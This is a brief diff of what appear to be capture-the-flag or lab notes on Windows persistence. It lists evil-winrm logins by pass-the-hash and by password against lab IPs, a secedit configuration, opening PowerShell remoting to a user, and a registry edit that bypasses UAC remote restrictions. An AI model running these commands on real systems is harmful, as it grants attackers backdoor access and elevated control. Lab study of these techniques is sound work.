@@ -494,5 +494,5 @@ evil-winrm -i 10.10.233.240 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 3️⃣ secedit /configure /db config.sdb /cfg config.inf
 4️⃣ Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI # add user and giving all access then WinRm eaneble for us 
 5️⃣ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 # Bypass UAC to activate “Backup Operators”
-6️⃣ Remote 
+6️⃣ evil-winrm -i 10.10.183.28 -u thmuser2 -p Password321
 ```
